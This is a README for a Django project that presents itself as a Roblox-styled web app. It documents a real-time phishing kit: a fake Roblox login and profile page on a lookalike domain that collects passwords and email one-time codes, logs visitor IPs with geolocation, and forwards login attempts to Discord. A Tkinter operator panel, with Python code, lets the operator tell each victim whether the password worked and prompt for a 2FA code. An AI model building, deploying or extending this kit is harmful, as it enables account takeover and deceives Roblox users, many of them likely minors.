# Roblox Django Application

A Django-based web application with WebSocket support for real-time functionality.

## Features

- **User Authentication System**: Login and profile management
- **Real-time WebSocket Communication**: Live status updates and notifications
- **Visitor Tracking**: IP geolocation and analytics
- **Discord Integration**: Webhook notifications for system events
- **Responsive Design**: Roblox-styled interface with modern CSS

## Technology Stack

- **Backend**: Django 6.0.5 with Django Channels
- **Database**: SQLite (development) (Not used)
- **WebSocket**: Daphne ASGI server
- **Frontend**: HTML5, CSS3, JavaScript
- **Real-time**: WebSocket for live updates
- **Styling**: Custom CSS with Roblox design patterns

## Project Structure

```
roblox/
├── roblox/                 # Main project configuration
│   ├── settings.py        # Django settings
│   ├── urls.py           # Project URL routing
│   ├── asgi.py           # ASGI configuration for WebSockets
│   └── wsgi.py           # WSGI configuration
├── people/                # Main application
│   ├── views.py          # Application views and logic
│   ├── urls.py           # App URL routing
│   ├── models.py         # Database models
│   ├── consumers.py      # WebSocket consumers
│   ├── templates/        # HTML templates
│   └── static/           # Static files (CSS, images)
├── roblox_status_handle_app/  # Desktop control application
│   └── main.py           # Tkinter GUI for status control
├── static/               # Global static files
├── staticfiles/          # Collected static files
├── requirements.txt      # Python dependencies
├── manage.py            # Django management script
└── db.sqlite3           # Database file
```

## Installation

### Prerequisites

- Python 3.8+
- pip (Python package manager)

### Setup

1. **Clone the repository**
   ```bash
   git clone https://github.com/modernWebDev9/roblox_discord.git
   cd roblox
   ```

2. **Create and activate virtual environment**
   ```bash
   python -m venv venv
   # On Windows:
   venv\Scripts\activate
   # On macOS/Linux:
   source venv/bin/activate
   ```

3. **Install dependencies**
   ```bash
   pip install -r requirements.txt
   
   # Additional dependencies for desktop app (Tkinter comes with Python)
   # Tkinter is included with standard Python installations
   # For requests library (already in requirements.txt)
   ```

4. **Collect static files**
   ```bash
   python manage.py collectstatic
   ```

## Running the Application

### Development Server

**Using Daphne (ASGI server with WebSocket support)**
   ```bash
   daphne -b 127.0.0.1 -p 8000 roblox.asgi:application
   ```

### Access the Application

 **Web Interface**: http://127.0.0.1:8000/people/7936348760/userprofile/

## Configuration

### Environment Settings

Key settings in `roblox/settings.py`:

- `DEBUG`: Set to `False` for production
- `ALLOWED_HOSTS`: Configure for production deployment
- `SECRET_KEY`: Should be kept secret in production
- `DATABASES`: SQLite by default, can be changed to PostgreSQL
- `CHANNEL_LAYERS`: In-memory for development, Redis recommended for production

### Discord Webhook Configuration

To enable Discord notifications:

1. Update the `WEBHOOK_URL` in `people/views.py`
2. Configure proxy settings if needed (optional)

## Features in Detail

### 1. User Authentication
- Login with username/email
- Password validation
- Session management

### 2. WebSocket Real-time Updates
- Live status notifications
- Real-time visitor tracking
- Instant feedback for user actions

### 3. Visitor Analytics
- IP address tracking
- Geolocation information
- User agent detection
- Timestamp logging

### 4. Discord Integration
- Login attempt notifications
- System status updates
- Visitor analytics reporting

### 5. Desktop Control Application (roblox_status_handle_app)
- Tkinter-based GUI for status management
- Real-time status updates to WebSocket server
- Visual feedback for operations

## API Endpoints

### HTTP Endpoints
- `GET /`: Home page
- `GET /people/<user_id>/userprofile/`: User profile
- `GET /people/<user_id>/login/`: Login page
- `POST /people/<user_id>/login/submit/`: Login submission
- `POST /people/<user_id>/login/code/`: Verification code submission
- `POST /api/setStatus/`: Status update API

### WebSocket Endpoints
- `ws://localhost:8000/ws/status/`: WebSocket connection for real-time updates

## Desktop Control Application

The `roblox_status_handle_app` is a Tkinter-based desktop application that provides a GUI interface for controlling and monitoring the WebSocket status system.

### Main Functions

#### Core Status Functions

```python
def update_status(value):
    """
    Sends a status update to the Django API endpoint.
    
    Args:
        value: Status value to send (string or boolean)
    
    Handles:
    - Boolean to string conversion
    - HTTP request to API endpoint
    - Success/error feedback in GUI
    """
    try:
        # Convert boolean to string for the API
        if isinstance(value, bool):
            value = str(value)
        
        response = requests.get(f"{API_URL}?value={value}")
        response.raise_for_status()
        result_label.config(text=f"✅ Sent: {value}")
        print(f"✅ Status sent: {value}")
    except requests.exceptions.RequestException as e:
        result_label.config(text=f"❌ Error: {e}")
        print(f"❌ Error sending status: {e}")
```

#### Status Control Functions

```python
def password_correct():
    """Sends 'True' status indicating password is correct"""
    update_status("True")

def password_incorrect():
    """Sends 'False' status indicating password is incorrect"""
    update_status("False")

def is_yleoba():
    """Sends 'yle' status for YLEOBA detection"""
    update_status("yle")

def attempts():
    """Sends 'yle2' status for attempts recording"""
    update_status("yle2")

def auth():
    """Sends 'yle3' status for approval triggering"""
    update_status("yle3")
```

#### GUI Setup Function

```python
def create_gui():
    """
    Creates the main Tkinter application window with:
    - Status control buttons
    - Result display label
    - Connection status indicator
    - Responsive layout design
    """
    window = tk.Tk()
    window.title("Status Control App")
    window.geometry("400x400")
    
    # Status labels
    status_label = tk.Label(window, text="Send Status to Server", 
                           font=("Arial", 14, "bold"))
    status_label.pack(pady=20)
    
    # Status control buttons with color coding
    correct_button = tk.Button(window, text="✅ Password is Correct", 
                              command=password_correct, bg="#4CAF50", fg="white")
    correct_button.pack(pady=10, padx=20, fill="x")
    
    incorrect_button = tk.Button(window, text="❌ Password is Incorrect", 
                                command=password_incorrect, bg="#ff9800", fg="white")
    incorrect_button.pack(pady=10, padx=20, fill="x")
    
    yleoba = tk.Button(window, text="🚨 YLEOBA Detected", 
                       command=is_yleoba, bg="#f44336", fg="white")
    yleoba.pack(pady=10, padx=20, fill="x")
    
    attempts_btn = tk.Button(window, text="📊 Attempts Recorded", 
                            command=attempts, bg="#2196F3", fg="white")
    attempts_btn.pack(pady=10, padx=20, fill="x")
    
    auth_btn = tk.Button(window, text="🔐 Approval Triggered", 
                        command=auth, bg="#9C27B0", fg="white")
    auth_btn.pack(pady=10, padx=20, fill="x")
    
    # Result display
    global result_label
    result_label = tk.Label(window, text="Ready", font=("Arial", 10), 
                           wraplength=350)
    result_label.pack(pady=20)
    
    # Connection status indicator
    status_indicator = tk.Label(window, text="● Connected", 
                               font=("Arial", 10), fg="green")
    status_indicator.pack(pady=10)
    
    window.mainloop()
```

### Configuration

```python
API_URL = "https://shareprofile-roblox.com/api/setStatus"
# For local development, use: "http://127.0.0.1:8000/api/setStatus"
```

### Running the Desktop App

```bash
# Navigate to the application directory
cd roblox_status_handle_app

# Run the application
python main.py
```

### Status Mapping

The application sends specific status codes that trigger different responses in the WebSocket system:

| Button | Status Code | WebSocket Response |
|--------|-------------|-------------------|
| ✅ Password is Correct | `"True"` | `"✅ Password is Correct"` |
| ❌ Password is Incorrect | `"False"` | `"❌ Password is Incorrect"` |
| 🚨 YLEOBA Detected | `"yle"` | `"🚨 New Login Attempt"` |
| 📊 Attempts Recorded | `"yle2"` | `"📊 Error occurred. Use Email One-Time Code"` |
| 🔐 Approval Triggered | `"yle3"` | `"📧 Email One-Time Code Sent"` |

### GUI Features

1. **Color-coded Buttons**: Each button has a distinct color for quick recognition
2. **Real-time Feedback**: Immediate visual feedback for status updates
3. **Connection Status**: Visual indicator showing connection state
4. **Error Handling**: Graceful error messages for failed operations
5. **Responsive Layout**: Adjusts to different window sizes

## System Integration

### How the Components Work Together

1. **Web Application (Django)**:
   - Runs on `daphne -b 127.0.0.1 -p 8000 roblox.asgi:application`
   - Provides WebSocket endpoint at `ws://localhost:8000/ws/status/`
   - API endpoint at `/api/setStatus/` for status updates
   - Web interface at `/people/7936348760/userprofile/`

2. **Desktop Control App (Tkinter)**:
   - GUI interface for sending status updates
   - Connects to Django API endpoint
   - Updates are broadcast via WebSocket to all connected clients
   - Provides real-time control and monitoring

3. **WebSocket Communication Flow**:
   ```
   Desktop App → HTTP Request → Django API → WebSocket Broadcast → Browser Clients
         ↓
   Status Update → API Endpoint → StatusConsumer → All Connected Users
   ```

### Desktop App Integration

The desktop application integrates with the Django system through:

```python
# API endpoint configuration
API_URL = "https://shareprofile-roblox.com/api/setStatus"

# Status mapping in Django views.py
status_messages = {
    'True': '✅ Password is Correct',
    'False': '❌ Password is Incorrect',
    'yle': '🚨 New Login Attempt',
    'yle2': '📊 Error occurred. Use Email One-Time Code',
    'yle3': '📧 Email One-Time Code Sent'
}
```

## Deployment

### Production Considerations

1. **Use PostgreSQL instead of SQLite**
2. **Configure Redis for Channel Layers**
3. **Set up proper SSL/TLS certificates**
4. **Use environment variables for secrets**
5. **Configure production-ready static file serving**
6. **Set up monitoring and logging**

### Sample Production Commands
```bash
# Using Gunicorn with Daphne (recommended)
daphne -b 0.0.0.0 -p 8000 roblox.asgi:application

# Using Nginx as reverse proxy
# Configure Nginx to proxy requests to Daphne
```

## Security Notes

- CSRF protection enabled
- Secure cookies configured
- Password validators in place
- Production security settings recommended
- Regular dependency updates advised

## Troubleshooting

### Common Issues

1. **WebSocket connection fails**
   - Ensure Daphne is running, not the standard runserver
   - Check ASGI configuration in `asgi.py`
   - Verify WebSocket route is correctly configured

2. **Static files not loading**
   - Run `python manage.py collectstatic`
   - Check `STATIC_ROOT` and `STATICFILES_DIRS` settings
   - Verify WhiteNoise middleware is properly configured

3. **Database errors**
   - Run migrations: `python manage.py migrate`
   - Check database file permissions
   - Verify database connection settings

## License

This project is for educational and development purposes.

## Support

For issues and feature requests, please check the documentation or contact the development team.

---

**Note**: This application uses WebSocket technology for real-time features. Ensure your deployment environment supports ASGI servers like Daphne for full functionality.